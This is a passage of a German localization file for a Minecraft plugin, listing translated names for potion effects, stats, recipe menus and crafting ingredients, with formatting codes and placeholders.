id,title,username,language,date,content
  ""effect_name_reflect_chance"": ""%icon% Reflexionswahrscheinlichkeit %value% %duration%"",
  ""effect_name_reflect_fraction"": ""%icon% Reflexionsschaden %value% %duration%"",
  ""effect_name_custom_luck"": ""%icon% Glück %value% %duration%"",
  ""effect_name_armor_flat"": ""%icon% Rüstung %value% %duration%"",
  ""effect_name_armor_fraction"": ""%icon% Rüstung %value% %duration%"",
  ""effect_name_armor_toughness_flat"": ""%icon% Härte %value% %duration%"",
  ""effect_name_armor_toughness_fraction"": ""%icon% Härte %value% %duration%"",
  ""effect_name_attack_speed"": ""%icon% Angriffsgeschwindigkeit %value% %duration%"",
  ""effect_name_knockback_resistance"": ""%icon% Rückstoßresistenz %value% %duration%"",
  ""effect_name_max_health_flat"": ""%icon% Maximale Gesundheit %value% %duration%"",
  ""effect_name_max_health_fraction"": ""%icon% Maximale Gesundheit %value% %duration%"",
  ""effect_name_movement_speed"": ""%icon% Bewegungsgeschwindigkeit %value% %duration%"",
  ""effect_name_smithing_masterpiece_flat"": ""%icon% Kurzzeitige Schmiedekunst %value% %duration%"",
  ""effect_name_smithing_masterpiece_fraction"": ""%icon% Kurzzeitige Schmiedekunst %value% %duration%"",
  ""effect_name_enchanting_masterpiece_flat"": ""%icon% Kurzzeitige Verzauberungsfertigkeit %value% %duration%"",
  ""effect_name_enchanting_masterpiece_fraction"": ""%icon% Kurzzeitige Verzauberungsfertigkeit %value% %duration%"",
  ""effect_name_alchemy_masterpiece_flat"": ""%icon% Kurzzeitige Alchemie-Fertigkeit %value% %duration%"",
  ""effect_name_alchemy_masterpiece_fraction"": ""%icon% Kurzzeitige Alchemie-Fertigkeit %value% %duration%"",
  ""effect_name_chocolate_milk"": ""%icon% Schokomilch"",
  ""effect_name_milk"": ""%icon% Milch"",
  ""effect_name_damage_explosion"": ""%icon% Explosionsschaden %value% %duration%"",
  ""effect_name_damage_fire"": ""%icon% Feuerschaden %value% %duration%"",
  ""effect_name_damage_magic"": ""%icon% Magieschaden %value% %duration%"",
  ""effect_name_damage_poison"": ""%icon% Giftschaden %value% %duration%"",
  ""effect_name_damage_bludgeoning"": ""%icon% Stumpfer Schaden %value% %duration%"",
  ""effect_name_damage_lightning"": ""%icon% Blitzschaden %value% %duration%"",
  ""effect_name_damage_freezing"": ""%icon% Frostschaden %value% %duration%"",
  ""effect_name_damage_radiant"": ""%icon% Strahlenschaden %value% %duration%"",
  ""effect_name_damage_necrotic"": ""%icon% Nekrose-Schaden %value% %duration%"",
  ""effect_name_extra_explosion_damage"": ""%icon% Explosionsschaden %value% %duration%"",
  ""effect_name_extra_fire_damage"": ""%icon% Feuerschaden %value% %duration%"",
  ""effect_name_extra_magic_damage"": ""%icon% Magieschaden %value% %duration%"",
  ""effect_name_extra_poison_damage"": ""%icon% Giftschaden %value% %duration%"",
  ""effect_name_extra_bludgeoning_damage"": ""%icon% Stumpfer Schaden %value% %duration%"",
  ""effect_name_extra_lightning_damage"": ""%icon% Blitzschaden %value% %duration%"",
  ""effect_name_extra_freezing_damage"": ""%icon% Frostschaden %value% %duration%"",
  ""effect_name_extra_radiant_damage"": ""%icon% Strahlenschaden %value% %duration%"",
  ""effect_name_extra_necrotic_damage"": ""%icon% Nekrose-Schaden %value% %duration%"",
  ""effect_name_extra_attack_damage"": ""%icon% Angriffsstärke %value% %duration%"",
  ""effect_name_cooking_speed"": ""%icon% Kochgeschwindigkeit %value% %duration%"",
  ""effect_name_sneak_movement_speed_bonus"": ""%icon% Schleichgeschwindigkeit %value% %duration%"",
  ""effect_name_sprint_movement_speed_bonus"": ""%icon% Renngeschwindigkeit %value% %duration%"",
  ""effect_name_stun"": ""%icon% Betäubung %duration%"",
  ""effect_name_jumps"": ""%icon% Mehrfachsprünge %value% %duration%"",
  ""effect_name_jump_height"": ""%icon% Sprungweite %value% %duration%"",
  ""effect_name_durability_multiplier"": ""%icon% Haltbarkeit %value% %duration%"",
  ""effect_name_entity_drops"": ""%icon% Mobs-Ausbeute %value% %duration%"",
  ""effect_name_light_armor"": ""%icon% Leichte Rüstung %value% %duration%"",
  ""effect_name_heavy_armor"": ""%icon% Schwere Rüstung %value% %duration%"",
  ""effect_name_fire"": ""%icon% Feuer %duration%"",
  ""effect_name_instant_explosion_damage"":""%icon% Sofortiger Explosionsschaden %value%"",
  ""effect_name_instant_fire_damage"": ""%icon% Sofortiger Feuerschaden %value%"",
  ""effect_name_instant_poison_damage"": ""%icon% Sofortiger Giftschaden %value%"",
  ""effect_name_instant_magic_damage"": ""%icon% Sofortiger Magieschaden %value%"",
  ""effect_name_instant_melee_damage"": ""%icon% Sofortiger Nahkampfschaden %value%"",
  ""effect_name_instant_projectile_damage"": ""%icon% Sofortiger Projektilschaden %value%"",
  ""effect_name_instant_bludgeoning_damage"": ""%icon% Sofortiger Stumpfer Schaden %value%"",
  ""effect_name_instant_lightning_damage"": ""%icon% Sofortiger Blitzschaden %value%"",
  ""effect_name_instant_freezing_damage"": ""%icon% Sofortiger Frostschaden %value%"",
  ""effect_name_instant_radiant_damage"": ""%icon% Sofortiger Strahlenschaden %value%"",
  ""effect_name_instant_necrotic_damage"": ""%icon% Sofortiger Nekrose-Schaden %value%"",
  ""effect_name_bleed"": ""%icon% Blutung %value% Schaden %duration%"",
  ""effect_name_antibleed"": ""%icon% Blutstillung"",
  ""effect_name_recall"": ""%icon% Rückruf"",
  ""effect_name_custom_heal"": ""%icon% Heilung %value%"",
  ""effect_name_lapis_save_chance"": ""%icon% Lapiskonsumtion %value% %duration%"",
  ""effect_name_enchanting_refund_chance"": ""%icon% Erfahrungskugel-Rückgabewahrscheinlichkeit %value% %duration%"",
  ""effect_name_enchanting_refund_fraction"": ""%icon% Rückgegebene Erfahrungskugeln %value% %duration%"",
  ""effect_name_lingering_duration_multiplier"": ""%icon% Nachhall-Dauer %value% %duration%"",
  ""effect_name_lingering_radius_multiplier"": ""%icon% Nachhall-Reichweite %value% %duration%"",
  ""effect_name_splash_intensity_minimum"": ""%icon% Spritz-Effizienz %value% %duration%"",
  ""effect_name_entity_rare_drops"": ""%icon% Mobs-Schatz %value% %duration%"",
  ""effect_name_dig_speed"": ""%icon% Abbaugeschwindigkeit %value% %duration%"",
  ""effect_name_crossbow_magazine"": ""%icon% Magazinkapazität %value% %duration%"",
  ""effect_name_attack_reach_multiplier"": ""%icon% Angriffsreichweite %value% %duration%"",
  ""effect_name_generic_scale"": ""%icon% Größe %value% %duration%"",
  ""effect_name_generic_block_interaction_range"": ""%icon% Reichweite %value% %duration%"",
  ""effect_name_generic_step_height"": ""%icon% Schrittweite %value% %duration%"",
  ""effect_name_shield_disarming"": ""%icon% Schildentwaffen %value% %duration%"",
  ""effect_name_life_steal"": ""%icon% Lebensraub %value% %duration%"",
  ""effect_name_generic_gravity"": ""%icon% Gravitation %value% %duration%"",
  ""effect_name_generic_safe_fall_distance"": ""%icon% Fallhöhe %value% %duration%"",
  ""effect_name_generic_fall_damage_multiplier"": ""%icon% Fallschaden %value% %duration%"",
  ""stat_potion_positive_prefix"": ""&a"",
  ""stat_potion_negative_prefix"": ""&c"",
  
  ""stat_icon_bow_strength"": """",
  ""stat_icon_heal"": """",
  ""stat_icon_bad_omen"": """",
  ""stat_icon_harm"": """",
  ""stat_icon_saturation"": """",
  ""stat_icon_absorption"": """",
  ""stat_icon_conduit_power"": """",
  ""stat_icon_blindness"": """",
  ""stat_icon_darkness"": """",
  ""stat_icon_confusion"": """",
  ""stat_icon_damage_resistance"": """",
  ""stat_icon_fast_digging"": """",
  ""stat_icon_fire_resistance"": """",
  ""stat_icon_glowing"": """",
  ""stat_icon_health_boost"": """",
  ""stat_icon_hero_of_the_village"": """",
  ""stat_icon_hunger"": """",
  ""stat_icon_increase_damage"": """",
  ""stat_icon_invisibility"": """",
  ""stat_icon_jump"": """",
  ""stat_icon_levitation"": """",
  ""stat_icon_luck"": """",
  ""stat_icon_poison"": """",
  ""stat_icon_regeneration"": """",
  ""stat_icon_slow"": """",
  ""stat_icon_slow_digging"": """",
  ""stat_icon_slow_falling"": """",
  ""stat_icon_speed"": """",
  ""stat_icon_unluck"": """",
  ""stat_icon_water_breathing"": """",
  ""stat_icon_weakness"": """",
  ""stat_icon_wither"": """",
  ""stat_icon_night_vision"": """",
  ""stat_icon_arrow_damage"": """",
  ""stat_icon_ammo_consumption"": """",
  ""stat_icon_arrow_velocity"": """",
  ""stat_icon_arrow_accuracy"": """",
  ""stat_icon_arrow_piercing"": """",
  ""stat_icon_knockback"": """",
  ""stat_icon_stun_chance"": """",
  ""stat_icon_bleed_chance"": """",
  ""stat_icon_bleed_damage"": """",
  ""stat_icon_bleed_duration"": """",
  ""stat_icon_crit_chance"": """",
  ""stat_icon_crit_damage"": """",
  ""stat_icon_armor_penetration_flat"": """",
  ""stat_icon_light_armor_penetration_flat"": """",
  ""stat_icon_heavy_armor_penetration_flat"": """",
  ""stat_icon_armor_penetration_fraction"": """",
  ""stat_icon_light_armor_penetration_fraction"": """",
  ""stat_icon_heavy_armor_penetration_fraction"": """",
  ""stat_icon_heavy_armor_damage"": """",
  ""stat_icon_light_armor_damage"": """",
  ""stat_icon_immunity_bonus_fraction"": """",
  ""stat_icon_immunity_bonus_flat"": """",
  ""stat_icon_immunity_reduction"": """",
  ""stat_icon_damage_unarmed"": """",
  ""stat_icon_damage_melee"": """",
  ""stat_icon_damage_ranged"": """",
  ""stat_icon_damage_all"": """",
  ""stat_icon_attack_reach"": """",
  ""stat_icon_velocity_damage"": """",
  ""stat_icon_dismount_chance"": """",
  ""stat_icon_custom_damage_resistance"": """",
  ""stat_icon_explosion_resistance"": """",
  ""stat_icon_fall_damage_resistance"": """",
  ""stat_icon_custom_fire_resistance"": """",
  ""stat_icon_magic_resistance"": """",
  ""stat_icon_bleed_resistance"": """",
  ""stat_icon_stun_resistance"": """",
  ""stat_icon_poison_resistance"": """",
  ""stat_icon_projectile_resistance"": """",
  ""stat_icon_melee_resistance"": """",
  ""stat_icon_dodge_chance"": """",
  ""stat_icon_healing_bonus"": """",
  ""stat_icon_food_consumption"": """",
  ""stat_icon_cooldown_reduction"": """",
  ""stat_icon_explosion_power"": """",
  ""stat_icon_crafting_speed"": """",
  ""stat_icon_alchemy_quality"": """",
  ""stat_icon_alchemy_quality_fraction"": """",
  ""stat_icon_enchanting_quality"": """",
  ""stat_icon_enchanting_quality_fraction"": """",
  ""stat_icon_anvil_quality_flat"": """",
  ""stat_icon_anvil_quality_fraction"": """",
  ""stat_icon_smithing_quality"": """",
  ""stat_icon_smithing_quality_fraction"": """",
  ""stat_icon_brewing_ingredient_consumption"": """",
  ""stat_icon_brewing_speed"": """",
  ""stat_icon_potion_consumption"": """",
  ""stat_icon_throwing_velocity"": """",
  ""stat_icon_mining_rare_drops"": """",
  ""stat_icon_mining_drops"": """",
  ""stat_icon_woodcutting_rare_drops"": """",
  ""stat_icon_woodcutting_drops"": """",
  ""stat_icon_digging_rare_drops"": """",
  ""stat_icon_digging_drops"": """",
  ""stat_icon_farming_rare_drops"": "" "",
  ""stat_icon_farming_drops"": """",
  ""stat_icon_fishing_luck"": """",
  ""stat_icon_skill_exp_gain"": """",
  ""stat_icon_vanilla_exp_gain"": """",
  ""stat_icon_damage_taken"": """",
  ""stat_icon_reflect_chance"": """",
  ""stat_icon_reflect_fraction"": """",
  ""stat_icon_custom_luck"": """",
  ""stat_icon_armor_flat"": """",
  ""stat_icon_armor_fraction"": """",
  ""stat_icon_armor_toughness_flat"": """",
  ""stat_icon_armor_toughness_fraction"": """",
  ""stat_icon_attack_speed"": """",
  ""stat_icon_generic_luck"": """",
  ""stat_icon_generic_armor"": """",
  ""stat_icon_generic_armor_toughness"": """",
  ""stat_icon_generic_attack_damage"": """",
  ""stat_icon_generic_attack_speed"": """",
  ""stat_icon_generic_knockback_resistance"": """",
  ""stat_icon_generic_max_health"": """",
  ""stat_icon_generic_movement_speed"": """",
  ""stat_icon_knockback_resistance"": """",
  ""stat_icon_max_health_flat"": """",
  ""stat_icon_max_health_fraction"": """",
  ""stat_icon_movement_speed"": """",
  ""stat_icon_smithing_masterpiece_flat"": """",
  ""stat_icon_smithing_masterpiece_fraction"": """",
  ""stat_icon_enchanting_masterpiece_flat"": """",
  ""stat_icon_enchanting_masterpiece_fraction"": """",
  ""stat_icon_alchemy_masterpiece_flat"": """",
  ""stat_icon_alchemy_masterpiece_fraction"": """",
  ""stat_icon_chocolate_milk"": """",
  ""stat_icon_milk"": """",
  ""stat_icon_extra_explosion_damage"": """",
  ""stat_icon_extra_fire_damage"": """",
  ""stat_icon_extra_magic_damage"": """",
  ""stat_icon_extra_poison_damage"": """",
  ""stat_icon_extra_bludgeoning_damage"": """",
  ""stat_icon_extra_lightning_damage"": """",
  ""stat_icon_extra_freezing_damage"": """",
  ""stat_icon_extra_radiant_damage"": """",
  ""stat_icon_extra_necrotic_damage"": """",
  ""stat_icon_extra_attack_damage"": """",
  ""stat_icon_damage_explosion"": """",
  ""stat_icon_damage_fire"": """",
  ""stat_icon_damage_magic"": """",
  ""stat_icon_damage_poison"": """",
  ""stat_icon_damage_bludgeoning"": """",
  ""stat_icon_damage_lightning"": """",
  ""stat_icon_damage_freezing"": """",
  ""stat_icon_damage_radiant"": """",
  ""stat_icon_damage_necrotic"": """",
  ""stat_icon_durability_multiplier"": """",
  ""stat_icon_entity_drops"": """",
  ""stat_icon_cooking_speed"": """",
  ""stat_icon_sneak_movement_speed_bonus"": """",
  ""stat_icon_sprint_movement_speed_bonus"": """",
  ""stat_icon_stun"": """",
  ""stat_icon_light_armor"": """",
  ""stat_icon_heavy_armor"": """",
  ""stat_icon_fire"": """",
  ""stat_icon_bleed"": """",
  ""stat_icon_antibleed"": """",
  ""stat_icon_instant_explosion_damage"":"""",
  ""stat_icon_instant_fire_damage"": """",
  ""stat_icon_instant_poison_damage"": """",
  ""stat_icon_instant_magic_damage"": """",
  ""stat_icon_instant_melee_damage"": """",
  ""stat_icon_instant_projectile_damage"": """",
  ""stat_icon_instant_bludgeoning_damage"": """",
  ""stat_icon_instant_lightning_damage"": """",
  ""stat_icon_instant_freezing_damage"": """",
  ""stat_icon_instant_radiant_damage"": """",
  ""stat_icon_instant_necrotic_damage"": """",
  ""stat_icon_recall"": """",
  ""stat_icon_custom_heal"": """",
  ""stat_icon_lapis_save_chance"": """",
  ""stat_icon_enchanting_refund_chance"": """",
  ""stat_icon_enchanting_refund_fraction"": """",
  ""stat_icon_jumps"": """",
  ""stat_icon_jump_height"": """",
  ""stat_icon_dig_speed"": """",
  ""stat_icon_mining_speed"": """",
  ""stat_icon_crossbow_magazine"": """",
  ""stat_icon_attack_reach_multiplier"": """",
  ""stat_icon_generic_scale"": """",
  ""stat_icon_generic_block_interaction_range"": """",
  ""stat_icon_generic_step_height"": """",
  ""stat_icon_shield_disarming"": """",
  ""stat_icon_life_steal"": """",
  ""stat_icon_generic_gravity"": """",
  ""stat_icon_generic_safe_fall_distance"": """",
  ""stat_icon_generic_fall_damage_multiplier"": """",
  
  ""translation_next_page"": ""&7&lNächste Seite"",
  ""translation_previous_page"": ""&7&lVorherige Seite"",
  ""translation_page_up"": ""&7&lSeitenaufwärts"",
  ""translation_page_down"": ""&7&lSeitenabwärts"",
  ""selectionmenu_recipe_immersive"": ""&8Rezept auswählen"",
  ""selectionmenu_recipe_immersive_favourites"": ""&6Favoriten"",
  ""selectionmenu_recipe_immersive_craftonly"": ""&7Herstellungsrezepte"",
  ""selectionmenu_recipe_immersive_tinkeronly"": ""&7Tüftelrezepte"",
  ""recipe_favourited_prefix"": ""&e[✰]&r"",
  ""recipe_favourited_suffix"": """",
  ""recipe_ingredient_format"": ""&7- &e%item% &7x &e%amount%"",
  ""recipe_uncraftable"": ""&cNicht herstellbar."",
  ""potion_base_format"": ""&r&fTrank der %effect%"",
  ""potion_splash_format"": ""&r&fSplaschtrank der %effect%"",
  ""potion_lingering_format"": ""&r&fNachhallender Trank der %effect%"",
  ""tipped_arrow_format"": ""&r&f%item% der %effect%"",
  ""item_generic_format"": ""&r&f%item% der %effect%"",
  ""combined_potion_base_format"": ""&r&dTrank der %effect%"",
  ""combined_potion_splash_format"": ""&r&dTrank der %effect%"",
  ""combined_potion_lingering_format"": ""&r&dTrank der %effect%"",
  ""combined_tipped_arrow_format"": ""&r&d%item% der %effect%"",
  ""combined_item_generic_format"": ""&r&d%item% der %effect%"",
  ""transmutation_potion"": ""&#edc80eMidastrunk"",
  ""blast_tnt_fortune"": ""Glück %level%"",
  ""blast_tnt_silk"": ""Samthandschuh"",
  ""blast_tnt_none"": ""Normal"",
  ""ingredient_any_armor"": ""Rüstung"",
  ""ingredient_any_plank"": ""Brettchen"",
  ""ingredient_any_log"": ""Stamm"",
  ""ingredient_any_anvil"": ""Amboss"",
  ""ingredient_any_cauldron"": ""Kessel"",
  ""ingredient_any_wool"": ""Wolle"",
  ""ingredient_any_bed"": ""Bett"",
  ""ingredient_any_banner"": ""Banner"",
  ""ingredient_any_candle"": ""Kerze"",
  ""ingredient_any_carpet"": ""Teppich"",
  ""ingredient_any_coal_ore"": ""Kohle-Erz"",
  ""ingredient_any_diamond_ore"": ""Diamant-Erz"",
  ""ingredient_any_gold_ore"": ""Gold-Erz"",
  ""ingredient_any_iron_ore"": ""Eisen-Erz"",
  ""ingredient_any_lapis_ore"": ""Lapis-Erz"",
  ""ingredient_any_copper_ore"": ""Kupfer-Erz"",
  ""ingredient_any_emerald_ore"": ""Smaragd-Erz"",
  ""ingredient_any_redstone_ore"": ""Redstone-Erz"",
  ""ingredient_any_door"": ""Tür"",
  ""ingredient_any_fence"": ""Zaun"",
  ""ingredient_any_fence_gate"": ""Zauntor"",
  ""ingredient_any_boat"": ""Boot"",
  ""ingredient_any_leaves"": ""Blätter"",
  ""ingredient_any_pressure_plate"": ""Druckplatte"",
  ""ingredient_any_sand"": ""Sand"",
  ""ingredient_any_sign"": ""Schild"",
